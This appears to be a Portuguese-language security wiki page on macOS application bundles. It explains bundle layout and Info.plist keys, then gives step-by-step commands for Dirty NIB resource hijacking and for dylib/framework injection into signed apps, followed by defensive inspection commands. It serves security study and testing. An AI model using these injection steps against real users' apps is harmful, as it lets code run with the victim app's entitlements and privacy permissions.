# macOS Bundles

{{#include ../../../banners/hacktricks-training.md}}

## Informações Básicas

Bundles no macOS servem como contêineres para uma variedade de recursos, incluindo aplicações, bibliotecas e outros arquivos necessários, fazendo-os aparecer como objetos únicos no Finder, como os familiares `*.app`. O bundle mais comumente encontrado é o `.app`, embora outros tipos como `.framework`, `.systemextension` e `.kext` também sejam prevalentes.

### Componentes Essenciais de um Bundle

Dentro de um bundle, particularmente no diretório `<application>.app/Contents/`, estão alojados diversos recursos importantes:

- **\_CodeSignature**: Este diretório armazena detalhes de code-signing vitais para verificar a integridade do aplicativo. Você pode inspecionar as informações de code-signing usando comandos como:
```bash
openssl dgst -binary -sha1 /Applications/Safari.app/Contents/Resources/Assets.car | openssl base64
```
- **MacOS**: Contém o binário executável da aplicação que é executado mediante interação do usuário.
- **Resources**: Repositório dos componentes da interface do usuário da aplicação, incluindo imagens, documentos e descrições de interface (nib/xib files).
- **Info.plist**: Atua como o arquivo de configuração principal da aplicação, crucial para o sistema reconhecer e interagir com a aplicação adequadamente.

#### Important Keys in Info.plist

O arquivo `Info.plist` é essencial para a configuração da aplicação, contendo chaves como:

- **CFBundleExecutable**: Especifica o nome do arquivo executável principal localizado no diretório `Contents/MacOS`.
- **CFBundleIdentifier**: Fornece um identificador global para a aplicação, usado extensivamente pelo macOS para gerenciamento de aplicações.
- **LSMinimumSystemVersion**: Indica a versão mínima do macOS necessária para a aplicação ser executada.

### Exploring Bundles

Para explorar o conteúdo de um bundle, como `Safari.app`, o seguinte comando pode ser usado: `bash ls -lR /Applications/Safari.app/Contents`

Essa exploração revela diretórios como `_CodeSignature`, `MacOS`, `Resources` e arquivos como `Info.plist`, cada um com um propósito específico, desde proteger a aplicação até definir sua interface e parâmetros operacionais.

#### Additional Bundle Directories

Além dos diretórios comuns, bundles também podem incluir:

- **Frameworks**: Contém frameworks empacotados usados pela aplicação. Frameworks são como dylibs com recursos adicionais.
- **PlugIns**: Diretório para plug-ins e extensões que aumentam as capacidades da aplicação.
- **XPCServices**: Contém serviços XPC usados pela aplicação para comunicação fora do processo.

Essa estrutura garante que todos os componentes necessários estejam encapsulados dentro do bundle, facilitando um ambiente de aplicação modular e seguro.

Para informações mais detalhadas sobre as chaves `Info.plist` e seus significados, a Apple developer documentation fornece recursos extensos: [Apple Info.plist Key Reference](https://developer.apple.com/library/archive/documentation/General/Reference/InfoPlistKeyReference/Introduction/Introduction.html).

## Security Notes & Abuse Vectors

- **Gatekeeper / App Translocation**: Quando um bundle em quarentena é executado pela primeira vez, o macOS realiza uma verificação profunda da assinatura e pode executá-lo a partir de um caminho translocado randomizado. Uma vez aceito, execuções posteriores realizam apenas verificações superficiais; arquivos de recurso em `Resources/`, `PlugIns/`, nibs, etc., historicamente não eram verificados. Desde o macOS 13 Ventura a verificação profunda é aplicada na primeira execução e a nova permissão TCC *App Management* restringe processos de terceiros de modificar outros bundles sem o consentimento do usuário, mas sistemas mais antigos continuam vulneráveis.
- **Bundle Identifier collisions**: Vários alvos embutidos (PlugIns, helper tools) reutilizando o mesmo `CFBundleIdentifier` podem quebrar a validação de assinatura e ocasionalmente permitir URL‑scheme hijacking/confusion. Sempre enumere sub‑bundles e verifique IDs únicos.

## Resource Hijacking (Dirty NIB / NIB Injection)

Antes do Ventura, trocar recursos de UI em um app assinado podia contornar o code signing superficial e resultar em execução de código com os entitlements do app. Pesquisas recentes (2024) mostram que isso ainda funciona em sistemas pre‑Ventura e em builds que não estão em quarentena:

1. Copie o app alvo para um local gravável (por exemplo, `/tmp/Victim.app`).
2. Substitua `Contents/Resources/MainMenu.nib` (ou qualquer nib declarado em `NSMainNibFile`) por um malicioso que instancie `NSAppleScript`, `NSTask`, etc.
3. Abra o app. O nib malicioso é executado sob o bundle ID e os entitlements da vítima (concessões TCC, microfone/câmera, etc.).
4. O Ventura+ mitiga isso verificando profundamente o bundle na primeira execução e exigindo a permissão *App Management* para modificações posteriores, então persistência fica mais difícil, mas ataques no primeiro lançamento em versões antigas do macOS ainda são aplicáveis.

Minimal malicious nib payload example (compile xib to nib with `ibtool`):
```bash
# create a nib that runs osascript -e 'do shell script "id"'
# ...build xib in Xcode, then
ibtool --compile MainMenu.nib MainMenu.xib
cp MainMenu.nib /tmp/Victim.app/Contents/Resources/
open /tmp/Victim.app
```
## Framework / PlugIn / dylib Hijacking dentro de Bundles

Porque as buscas por `@rpath` preferem Frameworks/PlugIns empacotados, colocar uma biblioteca maliciosa em `Contents/Frameworks/` ou `Contents/PlugIns/` pode redirecionar a ordem de carregamento quando o binário principal está assinado sem validação de bibliotecas ou com ordenação fraca de `LC_RPATH`.

Typical steps when abusing an unsigned/ad‑hoc bundle:
```bash
cp evil.dylib /tmp/Victim.app/Contents/Frameworks/
install_name_tool -add_rpath @executable_path/../Frameworks /tmp/Victim.app/Contents/MacOS/Victim
# or patch an existing load command
install_name_tool -change @rpath/Legit.dylib @rpath/evil.dylib /tmp/Victim.app/Contents/MacOS/Victim
codesign -f -s - --timestamp=none /tmp/Victim.app/Contents/Frameworks/evil.dylib
codesign -f -s - --deep --timestamp=none /tmp/Victim.app
open /tmp/Victim.app
```
Notas:
- Hardened runtime com `com.apple.security.cs.disable-library-validation` ausente bloqueia dylibs de terceiros; verifique entitlements primeiro.
- Serviços XPC em `Contents/XPCServices/` frequentemente carregam frameworks irmãos — patch seus binários da mesma forma para caminhos de persistence ou privilege escalation.

## Guia rápido de inspeção
```bash
# list top-level bundle metadata
/usr/libexec/PlistBuddy -c "Print :CFBundleIdentifier" /Applications/App.app/Contents/Info.plist

# enumerate embedded bundles
find /Applications/App.app/Contents -name "*.app" -o -name "*.framework" -o -name "*.plugin" -o -name "*.xpc"

# verify code signature depth
codesign --verify --deep --strict /Applications/App.app && echo OK

# show rpaths and linked libs
otool -l /Applications/App.app/Contents/MacOS/App | grep -A2 RPATH
otool -L /Applications/App.app/Contents/MacOS/App
```
## Referências

- [Bringing process injection into view(s): exploiting macOS apps using nib files (2024)](https://sector7.computest.nl/post/2024-04-bringing-process-injection-into-view-exploiting-all-macos-apps-using-nib-files/)
- [Dirty NIB & bundle resource tampering write‑up (2024)](https://karol-mazurek.medium.com/snake-apple-app-bundle-ext-f5c43a3c84c4)
{{#include ../../../banners/hacktricks-training.md}}
